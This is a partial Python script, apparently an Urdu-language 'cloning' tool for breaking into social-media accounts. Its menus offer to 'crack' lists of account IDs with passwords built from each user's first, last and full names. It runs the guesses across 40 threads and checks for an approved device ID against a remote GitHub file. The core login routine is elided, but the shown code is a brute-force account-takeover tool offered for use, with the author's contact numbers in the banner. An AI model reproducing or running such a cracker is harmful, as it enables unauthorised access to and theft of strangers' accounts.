...
import uuid
import zlib
from concurrent.futures import ThreadPoolExecutor as RAHIs
from datetime import datetime
...
if a=="ayaz rahi":
	...
	print("\033[1;91mwrong user name")
	raise SystemExit
...
''')
c=input("\033[1;96mSEARCH>>")
if c=="ayaz kon he":
	print("Ayaz ka pora naam muhmmad ayaz he ye aadi wala mien rahta he")
elif c=="Gandum Ka Rate Kam Kab Hoga":
   d=input("aap kisko suport krte ho?>>")
   if d=="miyan sahib":
   	print("apka koi qasoor nai aur suport kro😂😂")
elif c=="tools":
   	os.system('clear')
   	print('''
...
\__    _/(  ___  )\__   __/(  ___  )\__   __/
   ...
   |  |  | (___) |   | |   | |   | |   | |   
   |  |  |  ___  |   | |   | |   | |   | |        \033[1;92mX.SPEED\033[1;96m
   |  |  | (   ) |   | |   | |   | |   | |   
|\_)  )  | )   ( |   | |   | (___) |___) (___
(____/   |/     \|   )_(   (_______)\_______
................................................
PROGROMER💻 :AYAZ JATOI
WHATSAPP 📞: 03130535373
FACEBOOK : AYAZ RAHI
................................ ................
MIEN AYAZ RAHI APNE USTAD SKY KI IZAAT KRTA HOON
..................................................          """
def hasil(OK, cp):
    if not len(OK) != 0:
        pass
...
def ayazrahi():
    ...
    print(' [2] \033[1;97mCreate File ')
    print(' [3] \033[1;97mSeprate Idz ')
    print(' [4] \033[1;97mDouble Idz Cut From File ')
    print(' [5] \033[1;97mRemove Expire Token')
    print(' [0] \033[1;97mExit ')
    print('\033[1;97m-----------------------------------------------')
    _ffaisal___ = input('\033[1;96m[+] Choose : ')
...
class __xxx__:
    ...
    def __pler__(self):
        ...
        print(
            '\033[1;93m[4] \033[1;97mCrack With first last and fullname Pass \033[1;92m{Working Fast}')
        print('\033[1;97m-----------------------------------------------')
        ...
        if chi == '':
            ...
            print('[3] Method 3')
            jbg = input('Select: ')
            print('\033[1;97m[~] \033[1;97mTotal Ids : \033[1;92m%s ' %
                  len(self.id))
            print('\033[1;97m[~] \033[1;97mCloning Started \033[1;97m')
            print(47*"-")
            with RAHIs(max_workers=40) as RAHI:
                for zsb in self.id:  # Yo Ndak Tau Kok Tanya Saia
                    try:
                        ...
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            ...
                            pwx = [name, xz[0]+xz[1]]
                        if jbg == '1':
                            RAHI.submit(self.__metode__, uid,
            ...
            print('\033[1;97m[~] \033[1;97mTotal Ids : \033[1;92m%s ' %
                  len(self.id))
            print('\033[1;97m[~] \033[1;97m HAR KOI HUMIEN YAAD DELATA HE\033[1;97m')
            print(47*"-")
            with RAHIs(max_workers=40) as RAHI:
                for zsb in self.id:
                    try:
            ...
            print('\033[1;97m[~] \033[1;97mTotal Ids : \033[1;92m%s ' %
                  len(self.id))
            print('\033[1;97m[~] \033[1;97mJATOI X.SPEED\033[1;97m')
            print(47*"-")
            with RAHIs(max_workers=40) as RAHI:
                for zsb in self.id:
                    try:
...
def _f_a_md__eck():
    ...
    id = "-".join(uuid)
    try:
        httpCaht = requests.get('https://raw.githubusercontent.com/jatoi213/haji/main/Rahi.txt').text
        if id in httpCaht:
            ...
            os.system('xdg-open https://wa.me/+923193597075')
            time.sleep(1)
            sys.exit()
    except:
        sys.exit()
...
if __name__ == '__main__':
	...
	print("aise koi data nai google ke pass")
